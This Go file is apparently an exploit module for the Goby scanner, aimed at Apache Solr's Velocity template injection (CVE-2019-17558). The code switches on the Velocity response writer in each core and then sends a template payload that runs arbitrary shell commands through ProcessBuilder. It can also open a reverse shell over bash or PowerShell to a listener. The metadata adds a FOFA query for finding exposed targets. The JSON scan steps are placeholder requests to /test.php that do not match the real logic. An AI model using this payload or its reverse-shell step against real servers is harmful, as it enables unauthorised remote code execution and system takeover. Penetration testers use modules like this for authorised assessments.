package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Solr Velocity Template Injection Vulnerability (CVE-2019-17558)",
    "Description": "<p>Apache Solr is a search server based on Lucene, developed by the Apache Software Foundation. The software supports features such as faceted search, vertical search, and highlighting of search results.</p><p>A vulnerability has been discovered in Apache Solr versions 5.0.0 to 8.3.1 that allows injection attacks. Attackers can exploit this vulnerability using Velocity templates to execute arbitrary code on the system.</p>",
    "Product": "APACHE-Solr",
    "Homepage": "http://lucene.apache.org/solr/",
    "DisclosureDate": "2019-12-30",
    "PostTime": "2023-06-27",
    "Author": "fuhangqi@outlook.com",
    "FofaQuery": "title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\")",
    "GobyQuery": "title=\"Solr Admin\" || body=\"SolrCore Initialization Failures\" || body=\"app_config.solr_path\" || (banner=\"/solr/\" && banner=\"Location\" && banner!=\"couchdb\" && banner!=\"drupal\")",
    "Level": "3",
    "Impact": "<p>A vulnerability has been discovered in Apache Solr versions 5.0.0 to 8.3.1 that allows injection attacks. Attackers can exploit this vulnerability using Velocity templates to execute arbitrary code on the system.</p>",
    "Recommendation": "<p>The vendor has released a patch to fix the vulnerability, and the patch can be obtained from the following link: <a href=\"https://issues.apache.org/jira/browse/SOLR-13971\">https://issues.apache.org/jira/browse/SOLR-13971</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2019-17558"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "linux,windows",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2019-17558"
    ],
    "CNNVD": [
        "CNNVD-201912-1225"
    ],
    "CNVD": [
        "CNVD-2020-00500"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Apache Solr Velocity 模版注入漏洞（CVE-2019-17558）",
            "Product": "APACHE-Solr",
            "Description": "<p>Apache Solr是美国阿帕奇（Apache）基金会的一款基于Lucene（一款全文搜索引擎）的搜索服务器。该产品支持层面搜索、垂直搜索、高亮显示搜索结果等。</p><p>Apache Solr 5.0.0版本至8.3.1版本中存在注入漏洞。攻击者可借助Velocity模板利用该漏洞在系统上执行任意代码。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接： <a href=\"https://issues.apache.org/jira/browse/SOLR-13971\" target=\"_blank\">https://issues.apache.org/jira/browse/SOLR-13971</a><br></p>",
            "Impact": "<p>Apache Solr 5.0.0版本至8.3.1版本中存在注入漏洞。攻击者可借助Velocity模板利用该漏洞在系统上执行任意代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache Solr Velocity Template Injection Vulnerability (CVE-2019-17558)",
            "Product": "APACHE-Solr",
            "Description": "<p>Apache Solr is a search server based on Lucene, developed by the Apache Software Foundation. The software supports features such as faceted search, vertical search, and highlighting of search results.</p><p>A vulnerability has been discovered in Apache Solr versions 5.0.0 to 8.3.1 that allows injection attacks. Attackers can exploit this vulnerability using Velocity templates to execute arbitrary code on the system.</p>",
            "Recommendation": "<p>The vendor has released a patch to fix the vulnerability, and the patch can be obtained from the following link: <a href=\"https://issues.apache.org/jira/browse/SOLR-13971\" target=\"_blank\">https://issues.apache.org/jira/browse/SOLR-13971</a><br></p>",
            "Impact": "<p>A vulnerability has been discovered in Apache Solr versions 5.0.0 to 8.3.1 that allows injection attacks. Attackers can exploit this vulnerability using Velocity templates to execute arbitrary code on the system.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10802"
}`
	sendPayloadFlag08rE := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		rsp, err := httpclient.SimpleGet(hostInfo.FixedHostInfo + "/solr/admin/cores?indexInfo=false&wt=json")
		if err != nil {
			return nil, err
		}
		var data map[string]interface{}
		if err = json.Unmarshal([]byte(rsp.Utf8Html), &data); err != nil {
			return nil, errors.New("core 读取失败")
		}
		status := data["status"].(map[string]interface{})
		if status == nil || len(status) == 0 {
			return nil, errors.New("core 读取失败")
		}
		for core, _ := range status {
			// 更新模版
			postRequestConfig := httpclient.NewPostRequestConfig("/solr/" + core + "/config")
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			postRequestConfig.Data = `{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}`
			rsp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
			if err != nil {
				return nil, err
			}
			if strings.Contains(rsp.Utf8Html, `"Error loading class 'solr.VelocityResponseWriter'"`) {
				continue
			}
			uri := `#set($x='') #set($c = "` + cmd + `") #set($os = $x.class.forName("java.lang.System").getProperty("os.name")) #set($command = []) #if($os.toLowerCase().contains("win")) #set($command = ["cmd", "/c", $c]) #else #set($command = ["bash", "-c", $c]) #end #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($pbClass = $x.class.forName('java.lang.ProcessBuilder')) #set($constructor = $pbClass.getConstructors()[0]) #set($processBuilder = $constructor.newInstance($command)) #set($ex = $processBuilder.start()) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end`
			uri = `/solr/` + core + `/select?q=1&&wt=velocity&v.template=custom&v.template.custom=` + url.QueryEscape(uri)
			getRequestConfig := httpclient.NewGetRequestConfig(uri)
			getRequestConfig.VerifyTls = false
			getRequestConfig.FollowRedirect = false
			return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		}
		return nil, errors.New("漏洞测试失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			// echo solr-framework-goby md5 值内容
			rsp, err := sendPayloadFlag08rE(hostInfo, "echo 49920fb93da9e219")
			if err != nil {
				return false
			} else {
				return strings.Contains(rsp.Utf8Html, "49920fb93da9e219") && !strings.Contains(rsp.Utf8Html, `"responseHeader":{`)
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				rsp, err := sendPayloadFlag08rE(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else {
					if strings.Contains(rsp.Utf8Html, `"responseHeader":{`) {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					} else {
						expResult.Success = true
						expResult.Output = strings.Replace(rsp.Utf8Html, "             0  ", "", 1)
					}
				}
				return expResult
			} else if attackType == "reverse" {
				reverse := goutils.B2S(ss.Params["reverse"])
				waitSessionCh := make(chan string)
				var cmd string
				rp, err := godclient.WaitSession("reverse_"+reverse, waitSessionCh)
				if err != nil || len(rp) == 0 {
					expResult.Success = false
					expResult.Output = "GodServer 无可用端口"
					return expResult
				}
				if reverse == "windows" {
					cmd = godclient.ReverseTCPByPowershell(rp)
				} else {
					cmd = godclient.ReverseTCPByBash(rp)
				}
				sendPayloadFlag08rE(expResult.HostInfo, cmd)
				//检测为固定格式
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 10):
					expResult.Success = false
					expResult.Output = "反弹失败"
				}
				return expResult
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
		},
	))
}
